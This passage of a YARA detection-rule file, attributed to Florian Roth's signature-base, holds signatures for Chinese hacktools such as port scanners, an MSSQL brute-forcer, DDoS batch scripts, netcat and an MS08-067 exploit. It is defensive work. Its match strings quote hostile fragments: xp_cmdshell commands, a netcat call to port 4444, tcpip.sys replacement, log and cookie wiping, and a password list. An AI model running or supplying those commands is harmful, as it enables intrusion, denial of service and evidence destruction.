5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker__lcx_HTran2_4_htran20\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[SERVER]connection to %s:%d error\" fullword ascii\n        $s2 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n        $s3 = \"[+] Start Transmit (%s:%d <-> %s:%d) ......\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 440KB and all of them\n}\n\nrule ChineseHacktools_D_injection_V2_32_D_injection_V2_32_D_injection_V2_32\n{\n    meta:\n        description = \"Chinese hacktool (files: D_injection_V2.32.exe, D_injection_V2.32.exe, D_injection_V2.32.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker__D_injection_V2_32_D_injection_V2_32_D_injection_V2_32\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"upfile.asp \" fullword ascii\n        $s2 = \"[wscript.shell]\" fullword ascii\n        $s3 = \"XP_CMDSHELL\" fullword ascii\n        $s4 = \"[XP_CMDSHELL]\" fullword ascii\n        $s5 = \"http://d99net.3322.org\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 10000KB and 4 of them\n}\n\nrule ChineseHacktools_1014\n{\n    meta:\n        description = \"Chinese hacktool\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Chinese_Hacktool_1014\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"IEXT2_IDC_HORZLINEMOVECURSOR\" fullword wide\n        $s1 = \"msctls_progress32\" fullword wide\n        $s2 = \"Reply-To: %s\" fullword ascii\n        $s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n        $s4 = \"html htm htx asp\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_BAT_PortsOpen\n{\n    meta:\n        description = \"Chinese BAT hacktool for local port evaluation\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Hacktool_BAT_PortsOpen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"for /f \\\"skip=4 tokens=2,5\\\" %%a in ('netstat -ano -p TCP') do (\" ascii\n        $s1 = \"in ('tasklist /fi \\\"PID eq %%b\\\" /FO CSV') do \" ascii\n        $s2 = \"@echo off\" ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_SSPort_Portscanner\n{\n    meta:\n        description = \"Chinese port scanner (SSPort)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Hacktool_SSPort_Portscanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Golden Fox\" fullword wide\n        $s1 = \"Syn Scan Port\" fullword wide\n        $s2 = \"CZ88.NET\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_ScanPort_Portscanner\n{\n    meta:\n        description = \"Chinese port scanner (ScanPort)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Hacktool_ScanPort_Portscanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"LScanPort\" fullword wide\n        $s1 = \"LScanPort Microsoft\" fullword wide\n        $s2 = \"www.yupsoft.com\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_S_EXE_Portscanner\n{\n    meta:\n        description = \"Chinese port scanner (s.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Hacktool_S_EXE_Portscanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\Result.txt\" fullword ascii\n        $s1 = \"By:ZT QQ:376789051\" fullword ascii\n        $s2 = \"(http://www.eyuyan.com)\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_MilkT_BAT\n{\n    meta:\n        description = \"Chinese port scanner (MilkT)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Hacktool_MilkT_BAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" ascii\n        $s1 = \"if not \\\"%Choice%\\\"==\\\"\\\" set Choice=%Choice:~0,1%\" ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_MilkT_Scanner\n{\n    meta:\n        description = \"Chinese port scanner (MilkT)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Hacktool_MilkT_Scanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Bf **************\" ascii fullword\n        $s1 = \"forming Time: %d/\" ascii\n        $s2 = \"KERNEL32.DLL\" ascii fullword\n        $s3 = \"CRTDLL.DLL\" ascii fullword\n        $s4 = \"WS2_32.DLL\" ascii fullword\n        $s5 = \"GetProcAddress\" ascii fullword\n        $s6 = \"atoi\" ascii fullword\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_1433_Scanner\n{\n    meta:\n        description = \"Chinese MSSQL scanner\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Hacktool_1433_Scanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"1433\" wide fullword\n        $s1 = \"1433V\" wide\n        $s2 = \"del Weak1.txt\" ascii fullword\n        $s3 = \"del Attack.txt\" ascii fullword\n        $s4 = \"del /s /Q C:\\\\Windows\\\\system32\\\\doors\\\\\" fullword ascii\n        $s5 = \"!&start iexplore http://www.crsky.com/soft/4818.html)\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($s*)\n}\n\nrule ChineseHacktools_1433_Scanner_Comp2\n{\n    meta:\n        description = \"Chinese MSSQL scanner\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Hacktool_1433_Scanner_Comp2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"1433\" wide fullword\n        $s1 = \"1433V\" wide\n        $s2 = \"UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU\" ascii fullword\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($s*)\n}\n\nrule ChineseHacktools_Tzddos_DDoS_Tool_CN\n{\n    meta:\n        description = \"Chinese hacktool (file: tzddos)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Tzddos_DDoS_Tool_CN\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"for /f %%a in (host.txt) do (\" fullword ascii\n        $s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n        $s2 = \"del host.txt /q\" fullword ascii\n        $s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n        $s4 = \"start Http.exe %%a %http%\" fullword ascii\n        $s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n        $s6 = \"del Result.txt s2.txt s1.txt \" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_Ncat_Hacktools_CN\n{\n    meta:\n        description = \"Chinese hacktool (file: nc.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ncat_Hacktools_CN\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"nc -l -p port [options] [hostname] [port]\" fullword ascii\n        $s2 = \"nc [-options] hostname port[s] [ports] ... \" fullword ascii\n        $s3 = \"gethostpoop fuxored\" fullword ascii\n        $s6 = \"VERNOTSUPPORTED\" fullword ascii\n        $s7 = \"%s [%s] %d (%s)\" fullword ascii\n        $s12 = \" `--%s' doesn't allow an argument\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_MS08_067_Exploit_Hacktools_CN\n{\n    meta:\n        description = \"Chinese hacktool (file: cs.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MS08_067_Exploit_Hacktools_CN\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"MS08-067 Exploit for CN by EMM@ph4nt0m.org\" fullword ascii\n        $s3 = \"Make SMB Connection error:%d\" fullword ascii\n        $s5 = \"Send Payload Over!\" fullword ascii\n        $s7 = \"Maybe Patched!\" fullword ascii\n        $s8 = \"RpcExceptionCode() = %u\" fullword ascii\n        $s11 = \"ph4nt0m\" fullword wide\n        $s12 = \"\\\\\\\\%s\\\\IPC\" ascii\n\n    condition:\n        4 of them\n}\n\nrule ChineseHacktools_Burst_sql\n{\n    meta:\n        description = \"Chinese hacktool (file: sql.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Burst_sql\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"s.exe %s %s %s %s %d /save\" fullword ascii\n        $s2 = \"s.exe start error...%d\" fullword ascii\n        $s4 = \"EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'\" fullword ascii\n        $s7 = \"EXEC master..xp_cmdshell 'wscript.exe cc.js'\" fullword ascii\n        $s10 = \"Result.txt\" fullword ascii\n        $s11 = \"Usage:sql.exe [options]\" fullword ascii\n        $s17 = \"%s root %s %d error\" fullword ascii\n        $s18 = \"Pass.txt\" fullword ascii\n        $s20 = \"SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\\\\\sillyr_x.so' FROM sillyr_x\" fullword ascii\n\n    condition:\n        6 of them\n}\n\nrule ChineseHacktools_Panda_445TOOL\n{\n    meta:\n        description = \"Chinese hacktool (file: 445TOOL.rar)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Panda_445TOOL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"scan.bat\" fullword ascii\n        $s1 = \"Http.exe\" fullword ascii\n        $s2 = \"GOGOGO.bat\" fullword ascii\n        $s3 = \"ip.txt\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_Panda_445\n{\n    meta:\n        description = \"Chinese hacktool (file: 445.rar)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Panda_445\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"for /f %%i in (ips.txt) do (start cmd.bat %%i)\" fullword ascii\n        $s1 = \"445\\\\nc.exe\" fullword ascii\n        $s2 = \"445\\\\s.exe\" fullword ascii\n        $s3 = \"cs.exe %1\" fullword ascii\n        $s4 = \"445\\\\cs.exe\" fullword ascii\n        $s5 = \"445\\\\ip.txt\" fullword ascii\n        $s6 = \"445\\\\cmd.bat\" fullword ascii\n        $s9 = \"@echo off\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_WinEggDrop\n{\n    meta:\n        description = \"Chinese hacktool (file: s.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_WinEggDrop\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Normal Scan: About To Scan %u IP For %u Ports Using %d Thread\" fullword ascii\n        $s2 = \"SYN Scan: About To Scan %u IP For %u Ports Using %d Thread\" fullword ascii\n        $s6 = \"Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner\" fullword ascii\n        $s8 = \"Something Wrong About The Ports\" fullword ascii\n        $s9 = \"Performing Time: %d/%d/%d %d:%d:%d --> \" fullword ascii\n        $s10 = \"Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save\" fullword ascii\n        $s12 = \"%u Ports Scanned.Taking %d Threads \" fullword ascii\n        $s13 = \"%-16s %-5d -> \\\"%s\\\"\" fullword ascii\n        $s14 = \"SYN Scan Can Only Perform On WIN 2K Or Above\" fullword ascii\n        $s17 = \"SYN Scan: About To Scan %s:%d Using %d Thread\" fullword ascii\n        $s18 = \"Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports\" fullword ascii\n\n    condition:\n        5 of them\n}\n\nrule ChineseHacktools_Scan_BAT\n{\n    meta:\n        description = \"Chinese hacktool (file: scan.bat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Scan_BAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"for /f %%a in (host.txt) do (\" fullword ascii\n        $s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n        $s2 = \"del host.txt /q\" fullword ascii\n        $s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n        $s4 = \"start Http.exe %%a %http%\" fullword ascii\n        $s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n\n    condition:\n        5 of them\n}\n\nrule ChineseHacktools_Panda_Burst\n{\n    meta:\n        description = \"Chinese hacktool (file: Burst.rar)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Panda_Burst\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr.\" ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_445_cmd\n{\n    meta:\n        description = \"Chinese hacktool (file: cmd.bat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_445_cmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $bat = \"@echo off\" fullword ascii\n        $s0 = \"cs.exe %1\" fullword ascii\n        $s2 = \"nc %1 4444\" fullword ascii\n\n    condition:\n        $bat at 0 and all of ($s*)\n}\n\nrule ChineseHacktools_GOGOGO_Bat\n{\n    meta:\n        description = \"Chinese hacktool (file: GOGOGO.bat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_GOGOGO_Bat\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"for /f \\\"delims=\\\" %%x in (endend.txt) do call :lisoob %%x\" fullword ascii\n        $s1 = \"http://www.tzddos.com/ -------------------------------------------->byebye.txt\" fullword ascii\n        $s2 = \"ren %systemroot%\\\\system32\\\\drivers\\\\tcpip.sys tcpip.sys.bak\" fullword ascii\n        $s4 = \"IF /I \\\"%wangle%\\\"==\\\"\\\" ( goto start ) else ( goto erromm )\" fullword ascii\n        $s5 = \"copy *.tzddos scan.bat&del *.tzddos\" fullword ascii\n        $s6 = \"del /f tcpip.sys\" fullword ascii\n        $s9 = \"if /i \\\"%CB%\\\"==\\\"www.tzddos.com\\\" ( goto mmbat ) else ( goto wangle )\" fullword ascii\n        $s10 = \"call scan.bat\" fullword ascii\n        $s12 = \"IF /I \\\"%erromm%\\\"==\\\"\\\" ( goto start ) else ( goto zuihoujh )\" fullword ascii\n        $s13 = \"IF /I \\\"%zuihoujh%\\\"==\\\"\\\" ( goto start ) else ( goto laji )\" fullword ascii\n        $s18 = \"sc config LmHosts start= auto\" fullword ascii\n        $s19 = \"copy tcpip.sys %systemroot%\\\\system32\\\\drivers\\\\tcpip.sys > nul\" fullword ascii\n        $s20 = \"ren %systemroot%\\\\system32\\\\dllcache\\\\tcpip.sys tcpip.sys.bak\" fullword ascii\n\n    condition:\n        3 of them\n}\n\nrule ChineseHacktools_Burst_pass\n{\n    meta:\n        description = \"Chinese hacktool (file: pass.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Burst_pass\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"123456.com\" fullword ascii\n        $s1 = \"123123.com\" fullword ascii\n        $s2 = \"360.com\" fullword ascii\n        $s3 = \"123.com\" fullword ascii\n        $s4 = \"juso.com\" fullword ascii\n        $s5 = \"sina.com\" fullword ascii\n        $s7 = \"changeme\" fullword ascii\n        $s8 = \"master\" fullword ascii\n        $s9 = \"google.com\" fullword ascii\n        $s10 = \"chinanet\" fullword ascii\n        $s12 = \"lionking\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_JoHor_Posts_Killer\n{\n    meta:\n        description = \"Chinese hacktool (file: JoHor_Posts_Killer.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_JoHor_Posts_Killer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Multithreading Posts_Send Killer\" fullword ascii\n        $s3 = \"GET [Access Point] HTTP/1.1\" fullword ascii\n        $s6 = \"The program's need files was not exist!\" fullword ascii\n        $s7 = \"JoHor_Posts_Killer\" fullword wide\n        $s8 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword ascii\n        $s10 = \"  ( /s ) :\" fullword ascii\n        $s11 = \"forms.vbp\" fullword ascii\n        $s12 = \"forms.vcp\" fullword ascii\n        $s13 = \"Software\\\\FlySky\\\\E\\\\Install\" fullword ascii\n\n    condition:\n        5 of them\n}\n\nrule ChineseHacktools_Panda_tesksd\n{\n    meta:\n        description = \"Chinese hacktool (file: tesksd.jpg)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Panda_tesksd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"name=\\\"Microsoft.Windows.Common-Controls\\\" \" fullword ascii\n        $s1 = \"ExeMiniDownload.exe\" fullword wide\n        $s16 = \"POST %Hs\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_Http\n{\n    meta:\n        description = \"Chinese hacktool (file: Http.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Http\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"RPCRT4.DLL\" fullword ascii\n        $s1 = \"WNetAddConnection2A\" fullword ascii\n        $s2 = \"NdrPointerBufferSize\" fullword ascii\n        $s3 = \"_controlfp\" fullword ascii\n\n    condition:\n        all of them and filesize < 10KB\n}\n\nrule ChineseHacktools_Burst_Start\n{\n    meta:\n        description = \"Chinese hacktool (file: Start.bat - DoS tool)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Burst_Start\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"for /f \\\"eol= tokens=1,2 delims= \\\" %%i in (ip.txt) do (\" fullword ascii\n        $s1 = \"Blast.bat /r 600\" fullword ascii\n        $s2 = \"Blast.bat /l Blast.bat\" fullword ascii\n        $s3 = \"Blast.bat /c 600\" fullword ascii\n        $s4 = \"start Clear.bat\" fullword ascii\n        $s5 = \"del Result.txt\" fullword ascii\n        $s6 = \"s syn %%i %%j 3306 /save\" fullword ascii\n        $s7 = \"start Thecard.bat\" fullword ascii\n        $s10 = \"setlocal enabledelayedexpansion\" fullword ascii\n\n    condition:\n        5 of them\n}\n\nrule ChineseHacktools_Panda_tasksvr\n{\n    meta:\n        description = \"Chinese hacktool (file: tasksvr.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Panda_tasksvr\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Consys21.dll\" fullword ascii\n        $s4 = \"360EntCall.exe\" fullword wide\n        $s15 = \"Beijing1\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_Burst_Clear\n{\n    meta:\n        description = \"Chinese hacktool (file: Clear.bat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Burst_Clear\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"del /f /s /q %systemdrive%\\\\*.log    \" fullword ascii\n        $s1 = \"del /f /s /q %windir%\\\\*.bak    \" fullword ascii\n        $s4 = \"del /f /s /q %systemdrive%\\\\*.chk    \" fullword ascii\n        $s5 = \"del /f /s /q %systemdrive%\\\\*.tmp    \" fullword ascii\n        $s8 = \"del /f /q %userprofile%\\\\COOKIES s\\\\*.*    \" fullword ascii\n        $s9 = \"rd /s /q %windir%\\\\temp & md %windir%\\\\temp    \" fullword ascii\n        $s11 = \"del /f /s /q %systemdrive%\\\\recycled\\\\*.*    \" fullword ascii\n        $s12 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temp\\\\*.*\\\"    \" fullword ascii\n        $s19 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temporary Internet Files\\\\*.*\\\"   \" ascii\n\n    condition:\n        5 of them\n}\n\nrule ChineseHacktools_Burst_Thecard\n{\n    meta:\n        description = \"Chinese hacktool (file: Thecard.bat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Burst_Thecard\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"tasklist |find \\\"Clear.bat\\\"||start Clear.bat\" fullword ascii\n        $s1 = \"Http://www.coffeewl.com\" fullword ascii\n        $s2 = \"ping -n 2 localhost 1>nul 2>nul\" fullword ascii\n        $s3 = \"for /L %%a in (\" fullword ascii\n        $s4 = \"MODE con: COLS=42 lines=5\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_Burst_Blast\n{\n    meta:\n        description = \"Chinese hacktool (file: Blast.bat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Hacktools_CN_Burst_Blast\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:\" ascii\n        $s1 = \"@echo off\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule ChineseHacktools_CN_Portscan : APT\n{\n    meta:\n        description = \"Chinese port 